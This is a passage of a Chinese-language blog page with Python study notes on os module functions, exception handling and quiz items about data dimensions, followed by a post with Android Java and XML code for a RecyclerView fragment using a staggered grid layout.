<li><p><code>os.rmdir(path)</code>: 删除文件夹。</p>
</li>
<li><p><code>os.remove(path)</code>: 删除文件。</p>
</li>
<li><p><code>os.rename(src, dst)</code>: 重命名文件或文件夹从src到dst。</p>
</li>
<li><p><code>os.stat(path)</code>: 获取文件&#x2F;目录信息。</p>
</li>
<li><p><code>os.system(command)</code>: 运行系统的shell命令。</p>
</li>
<li><p><code>os.environ</code>: 一个字典包含环境变量。</p>
</li>
<li><p><code>os.path.abspath(path)</code>: 返回绝对路径。</p>
</li>
<li><p><code>os.path.split(path)</code>: 把路径分割成dirname和basename，返回一个元组。</p>
</li>
<li><p><code>os.path.dirname(path)</code>: 返回路径的目录。</p>
</li>
<li><p><code>os.path.basename(path)</code>: 返回路径中的文件名。</p>
</li>
<li><p><code>os.path.exists(path)</code>: 如果路径存在，返回True；如果路径不存在，返回False。</p>
</li>
<li><p><code>os.path.isfile(path)</code>: 如果路径是一个存在的文件，返回True。否则返回False。</p>
</li>
<li><p><code>os.path.isdir(path)</code>: 如果路径是一个存在的目录，则返回True。否则返回False。</p>
</li>
<li><p><code>os.path.join(path1, path2, ...)</code>: 把目录和文件名合成一个路径。</p>
</li>
</ol>
<h2 id="7-3-异常处理"><a href="#7-3-异常处理" class="headerlink" title="7.3 异常处理"></a>7.3 异常处理</h2><ol>
<li>异常处理 try-except语句</li>
</ol>
<p>格式1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try :&lt;语句1&gt;</span><br><span class="line">except:&lt;语句2&gt;</span><br></pre></td></tr></table></figure>

<p>语句1的正常执行的程序内容,当发生异常时执行except后面的语句</p>
<p>格式2: 异常高级用法 支持多个except</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try :&lt;语句1&gt;</span><br><span class="line">except &lt;异常类型1&gt;:&lt;语句2&gt;</span><br><span class="line">except &lt;异常类型N&gt;:&lt;语句N+1&gt;</span><br><span class="line">except :&lt;语句N+2&gt;</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;异常语句还能与else和 finally 保留字 配合使用&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try :&lt;语句1&gt;</span><br><span class="line">except:&lt;语句2&gt;</span><br><span class="line">else :&lt;语句3&gt;</span><br><span class="line">finally :&lt;语句4&gt;</span><br></pre></td></tr></table></figure>

<p>else: 当try的语句1正常执行结束且没有发生异常时,else中语句3运行<br>finally: 无论try语句1是否异常,语句4都执行<br>2. NameError 是一种异常类型</p>
<h2 id="7-5高维数据"><a href="#7-5高维数据" class="headerlink" title="7.5高维数据"></a>7.5高维数据</h2><ol>
<li><p>高维数据由键值对类型的数据构成，采用对象方式组织</p>
</li>
<li><p>一维数据采用线性方式组织，对应于数学中的数组和集合等概念</p>
</li>
<li><p>二维数据采用表格方式组织，对应于数学中的矩阵</p>
</li>
<li><p>列表ls&#x3D;[ 1,2,3, 4,5,6,[7,8,9 ] ]，以下选项中描述正确的是：ls可能是一维列表</p>
</li>
<li><p>列表ls&#x3D;[ [ 1,2,3,4,5,6,7,8,9 ] ]，以下选项中描述错误的是：ls可能是高维列表<br> 正确：ls可能是一维列表<br>  ls可能是二维列表<br>  ls可能是多维列表</p>
</li>
<li><p>CSV文件的扩展名可以为任意扩展名</p>
</li>
<li><p>CSV 文件并没有特定的多种编码方式，而是使用文件本身所采用的字符编码格式。例如 UTF-8、ASCII 等</p>
</li>
<li><p>关于高维数据，以下选项中描述错误的是： 高      维数据只能表达键值对数据<br> 正确：“键值对”是高维数据的主要特征<br>  高维数据可用于表达一二维数据<br>  高维数据用来表达索引和数据之间的关系</p>
</li>
<li><p>所有数据都能用维度方式表示</p>
</li>
<li><p>我们通常会将图像数据视为三维数据甚至更高维度</p>
</li>
<li><p>对于无序的一维数据，描述错误的选项是：<br>D. 无序一维数据无法利用Python语言有效表达<br>解释如下：<br>A. 无序一维数据可以采用列表类型来表达 - 正确。Python中的列表是一种顺序容器，可以用来表示一维数据。尽管列表通常用于存储有序数据，但是我们也可以用它来存储无序数据，只要我们不关心数据的顺序。</p>
</li>
</ol>
<p>B. 无序一维数据可以采用字典类型来表达 - 正确。字典的键可以是任意类型，所以我们可以把一维数据存储在字典的键中，从而表示无序的一维数据。注意，从Python 3.7开始，字典已经是有序的，但是我们仍然可以用它来表示无序数据，只要我们不关心数据的顺序。</p>
<p>C. 无序一维数据可以采用集合类型来表达 - 正确。集合是一种无序的容器，它不存储重复的元素，所以可以用来表示无序的一维数据。</p>
<p>D. 无序一维数据无法利用Python语言有效表达 - 错误。如上所述，Python中的列表、字典、集合都可以用来表示无序的一维数据。</p>
<h1 id="第八章-类与对象"><a href="#第八章-类与对象" class="headerlink" title="第八章 类与对象"></a>第八章 类与对象</h1><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>每天先整理后刷题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_66397563/article/details/123939944">本文地址</a> </p>
<p><a target="_blank" rel="noopener" href="https://huaweicloud.csdn.net/6380686cdacf622b8df86e96.html?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-3-127954575-blog-123939944.235%5Ev38%5Epc_relevant_sort_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-3-127954575-blog-123939944.235%5Ev38%5Epc_relevant_sort_base2&utm_relevant_index=6">Python学习笔记合集(总结)_python_北岛末巷-DevPress官方社区 (csdn.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/K_savo/article/details/130198692">(99条消息) Python123选择题练习+解析（1~150）_小王不想睡觉的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/bd/art/404927221?source_id=1001">Python精品题型选择题（附带答案详解）-持续更新系列 (zhihu.com)</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/ba95bad06ff4.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-05</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%8D%93%E8%AE%BA%E6%96%87/">安卓论文</a></span><div class="content"><p>package com.example.test.ui.home;  </p>
<p>import android.os.Bundle;<br>import android.view.LayoutInflater;<br>import android.view.View;<br>import android.view.ViewGroup;<br>import android.widget.ImageView;<br>import android.widget.TextView;  </p>
<p>import androidx.annotation.NonNull;<br>import androidx.fragment.app.Fragment;<br>import androidx.lifecycle.ViewModelProvider;<br>import androidx.recyclerview.widget.RecyclerView;<br>import androidx.recyclerview.widget.StaggeredGridLayoutManager;  </p>
<p>import com.example.test.R;<br>import com.example.test.databinding.FragmentHomeBinding;  </p>
<p>import java.util.ArrayList;<br>import java.util.List;<br>import java.util.Random;  </p>
<p>public class HomeFragment extends Fragment {  </p>
<pre><code>private FragmentHomeBinding binding;  
private RecyclerView recyclerView;  
private List&lt;CardData&gt; cardDataList;  

public View onCreateView(@NonNull LayoutInflater inflater,  
                         ViewGroup container, Bundle savedInstanceState) &#123;  
    View root = inflater.inflate(R.layout.fragment_home, container, false);  

    // Initialize your data.  
    cardDataList = new ArrayList&lt;&gt;();  
    cardDataList.add(new CardData(R.drawable.p1, &quot;Text 1&quot;));  
    cardDataList.add(new CardData(R.drawable.p2, &quot;Text 2&quot;));  
    cardDataList.add(new CardData(R.drawable.p3, &quot;Text 3&quot;));  
    cardDataList.add(new CardData(R.drawable.p4, &quot;Text 4&quot;));  

    recyclerView =root.findViewById(R.id.recyclerView);  
    recyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));  
    recyclerView.setAdapter(new MyAdapter());  

    return root;  
&#125;  


private class MyAdapter extends RecyclerView.Adapter&lt;MyAdapter.MyViewHolder&gt; &#123;  

    private Random random = new Random();  

    private static final int HEIGHT_TYPE_1_DP = 400;  
    private static final int HEIGHT_TYPE_2_DP = (int)(HEIGHT_TYPE_1_DP * 1.2);  

    @Override  
    public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) &#123;  
        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_card, parent, false);  
        return new MyViewHolder(view);  
    &#125;  

    @Override  
    public void onBindViewHolder(MyViewHolder holder, int position) &#123;  
        // Set your image and text here.  
        // You can use position to get the corresponding data.            // holder.imageView.setImageResource(...);            // holder.textView.setText(...);            CardData cardData = cardDataList.get(position);  
        holder.imageView.setImageResource(cardData.getImageResId());  
        holder.textView.setText(cardData.getText());  

        // Set the height of imageView.  
        ViewGroup.LayoutParams layoutParams = holder.imageView.getLayoutParams();  
        if (position % 2 == 0) &#123;  
            layoutParams.height = dpToPx(HEIGHT_TYPE_2_DP);  
        &#125; else &#123;  
            layoutParams.height = dpToPx(HEIGHT_TYPE_1_DP);  
        &#125;  
        holder.imageView.setLayoutParams(layoutParams);  
    &#125;  

    @Override  
    public int getItemCount() &#123;  
        // Return the total number of items.  
        // You should replace this with your own data.            return cardDataList.size();  
    &#125;  

    private int dpToPx(int dp) &#123;  
        float density = getResources().getDisplayMetrics().density;  
        return (int) (dp * density + 0.5f);  
    &#125;  
    class MyViewHolder extends RecyclerView.ViewHolder &#123;  

        ImageView imageView;  
        TextView textView;  

        MyViewHolder(View view) &#123;  
            super(view);  
            imageView = view.findViewById(R.id.imageView);  
            textView = view.findViewById(R.id.textView);  
        &#125;  
    &#125;  
&#125;  


public class CardData &#123;  
    private int imageResId;  
    private String text;  

    public CardData(int imageResId, String text) &#123;  
        this.imageResId = imageResId;  
        this.text = text;  
    &#125;  

    public int getImageResId() &#123;  
        return imageResId;  
    &#125;  

    public String getText() &#123;  
        return text;  
    &#125;  
&#125;  



@Override  
public void onDestroyView() &#123;  
    super.onDestroyView();  
    binding = null;  
&#125;  
</code></pre>
<p>}</p>
<?xml version="1.0" encoding="utf-8"?><p>&lt;androidx.coordinatorlayout.widget.CoordinatorLayout xmlns:android&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res/android">http://schemas.android.com/apk/res/android</a>“<br>    xmlns:app&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res-auto">http://schemas.android.com/apk/res-auto</a>“<br>    xmlns:tools&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/tools">http://schemas.android.com/tools</a>“<br>    android:layout_width&#x3D;”match_parent”<br>    android:layout_height&#x3D;”match_parent”<br>    tools:context&#x3D;”.ui.home.HomeFragment”&gt;  </p>
<pre><code>&lt;com.google.android.material.appbar.AppBarLayout        android:layout_width=&quot;match_parent&quot;  
    android:layout_height=&quot;wrap_content&quot;&gt;  

    &lt;ImageView            android:id=&quot;@+id/topImageView&quot;  
        android:layout_width=&quot;match_parent&quot;  
        android:layout_height=&quot;200dp&quot;  
        android:src=&quot;@drawable/p5&quot;  
        android:scaleType=&quot;centerCrop&quot;  
        app:layout_scrollFlags=&quot;scroll|enterAlways|snap&quot; /&gt;  

&lt;/com.google.android.material.appbar.AppBarLayout&gt;  
&lt;androidx.recyclerview.widget.RecyclerView        android:id=&quot;@+id/recyclerView&quot;  
    android:layout_width=&quot;match_parent&quot;  
    android:layout_height=&quot;match_parent&quot;  
    android:layout_marginTop=&quot;0dp&quot;  
    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; /&gt;  

&lt;com.google.android.material.floatingactionbutton.FloatingActionButton        android:id=&quot;@+id/scrollToTopButton&quot;  
    android:layout_width=&quot;wrap_content&quot;  
    android:layout_height=&quot;wrap_content&quot;  
    android:layout_margin=&quot;16dp&quot;  
    android:src=&quot;@drawable/ic_notifications_black_24dp&quot;  
    app:layout_anchor=&quot;@id/recyclerView&quot;  
    app:layout_anchorGravity=&quot;bottom|end&quot;  
    app:layout_behavior=&quot;com.google.android.material.behavior.HideBottomViewOnScrollBehavior&quot; /&gt;  
</code></pre>
<p>&lt;&#x2F;androidx.coordinatorlayout.widget.CoordinatorLayout&gt;</p>
<?xml version="1.0" encoding="utf-8"?><p>&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res/android">http://schemas.android.com/apk/res/android</a>“<br>    xmlns:app&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res-auto">http://schemas.android.com/apk/res-auto</a>“<br>    xmlns:tools&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/tools">http://schemas.android.com/tools</a>“<br>    android:layout_width&#x3D;”match_parent”<br>    android:layout_height&#x3D;”match_parent”<br>    tools:context&#x3D;”.ui.home.HomeFragment”&gt;<br>    <ImageView        android:id="@+id/topImageView"  
        android:layout_width="0dp"  
        android:layout_height="200dp"  
        android:src="@drawable/p5"  
        app:layout_constraintTop_toTopOf="parent"  
        app:layout_constraintStart_toStartOf="parent"  
        app:layout_constraintEnd_toEndOf="parent" />  </p>
<pre><code>&lt;com.google.android.material.floatingactionbutton.FloatingActionButton        android:id=&quot;@+id/scrollToTopButton&quot;  
    android:layout_width=&quot;wrap_content&quot;  
    android:layout_height=&quot;wrap_content&quot;  
    android:layout_alignParentEnd=&quot;true&quot;  
    android:layout_alignParentBottom=&quot;true&quot;  
    android:layout_margin=&quot;16dp&quot;  
    android:layout_marginEnd=&quot;52dp&quot;  
    android:layout_marginBottom=&quot;144dp&quot;  
    android:src=&quot;@drawable/ic_notifications_black_24dp&quot;  
    app:backgroundTint=&quot;@color/purple_500&quot;  
    app:layout_constraintBottom_toBottomOf=&quot;@+id/recyclerView&quot;  
    app:layout_constraintEnd_toEndOf=&quot;@+id/recyclerView&quot; /&gt;  

&lt;androidx.recyclerview.widget.RecyclerView       
     android:id=&quot;@+id/recyclerView&quot;  
    android:layout_width=&quot;0dp&quot;  
    android:layout_height=&quot;0dp&quot;  
    android:layout_marginBottom=&quot;?attr/actionBarSize&quot;  
    android:layout_marginTop=&quot;150dp&quot;  
    app:layout_constraintBottom_toBottomOf=&quot;parent&quot;  
    app:layout_constraintHorizontal_bias=&quot;0.0&quot;  
    app:layout_constraintLeft_toLeftOf=&quot;parent&quot;  
    app:layout_constraintRight_toRightOf=&quot;parent&quot;  
    app:layout_constraintTop_toTopOf=&quot;parent&quot;  
    app:layout_constraintVertical_bias=&quot;1.0&quot; /&gt;  
</code></pre>
<p>&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>